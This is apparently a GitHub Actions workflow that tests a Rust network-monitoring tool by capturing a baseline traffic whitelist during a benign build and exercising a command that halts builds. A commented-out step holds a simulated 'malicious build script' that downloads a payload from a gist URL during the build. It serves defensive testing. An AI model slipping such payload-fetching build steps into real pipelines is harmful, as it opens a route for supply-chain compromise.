name: Test of the project

on:
  pull_request:
    branches: ["*"]

jobs:
  create_whitelist:
    runs-on: ubuntu-latest

    steps:
      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@nightly

      - name: Install dependencies (pcap + tmux)
        run: |
          sudo apt-get update
          sudo apt-get install -y libpcap-dev tmux

      - name: ðŸ“¦ Checkout code
        uses: actions/checkout@v3

      - name: ðŸ Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: "3.10"

      - name: âš™ï¸ Build your release binary
        run: cargo build --release

      - name: âœï¸ Create legitimate build script
        run: |
          cat > build.py << 'EOF'
          import subprocess
          import sys
          import requests

          # Print Python version (legitimate action)
          print(f"Python version: {sys.version}")

          # Download a legitimate dependency (from PyPI)
          print("Downloading requests library info from PyPI...")
          response = requests.get("https://pypi.org/pypi/requests/json")
          print(f"Downloaded PyPI info: {response.status_code}")

          # Run pip list (legitimate action)
          subprocess.run(["pip", "list"])

          print("Build completed successfully!")
          EOF

      - name: ðŸ Install Python deps
        run: pip install requests

      - name: ðŸŽ¯ Generate the custom whitelist via tmux
        run: |
          # 1) Kill any prior session so we start clean
          tmux kill-session -t whitelist 2>/dev/null || true

          # 2) Spawn listener in a detached tmux session for 120 s
          tmux new-session -d -s whitelist \
            "bash -lc 'cargo run --release -- create-whitelist 120 \
              --file runner-ubuntu-whitelist.json > whitelist.log 2>&1'"

          # 3) Give it a moment to bind its capture socket
          sleep 5

          # 4) Run your â€œlegitimateâ€ build to produce baseline traffic
          python build.py
          ping -w 30 google.com

          # 5) Wait until the listenerâ€™s session dies (i.e. 120 s have passed)
          echo "Waiting for listener to finish capturing (up to 120 s)â€¦"
          timeout 130 bash -c 'while tmux has-session -t whitelist 2>/dev/null; do sleep 1; done'

          # 6) Clean up the tmux session (if it's still around)
          tmux kill-session -t whitelist 2>/dev/null || true

      - name: ðŸ“„ Show generated whitelist & listener log
        run: |
          echo "=== runner-ubuntu-whitelist.json ==="
          cat runner-ubuntu-whitelist.json || echo "(empty)"
          echo
          echo "=== whitelist.log ==="
          cat whitelist.log || echo "(no logs)"

      # - name: ðŸ Create malicious build script
      #   run: |
      #     cat > build_malicious.py << 'EOF'
      #     import subprocess, sys, requests

      #     print(f"Python version: {sys.version}")
      #     print("Attempting to fetch malicious payload from gist.githubusercontent.comâ€¦")
      #     resp = requests.get(
      #       "https://gist.githubusercontent.com/gewashington/a4d0211e6f8601b69ff74e30d9e3ca20/raw/9d3e37cf7742b41e39606e70aab7a4f971353749/practice-python-fibonnaci.py"
      #     )
      #     print(f"Got {resp.status_code}")
      #     subprocess.run(["pip", "list"])
      #     print("Build (malicious) completed!")
      #     EOF

      # - name: ðŸ´â€â˜ ï¸ Run malicious build script
      #   run: python build_malicious.py

  test_halt:
    runs-on: ubuntu-latest
    permissions:
      actions: write
      contents: read
    env:
      GH_TOKEN: ${{ github.token }}
    steps:
      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@nightly

      - name: Install dependencies (pcap + tmux)
        run: |
          sudo apt-get update
          sudo apt-get install -y libpcap-dev tmux

      - name: ðŸ“¦ Checkout code
        uses: actions/checkout@v3
      - name: âš™ï¸ Build your release binary
        run: |
          cargo run --release halt "Build blocked by security policy"
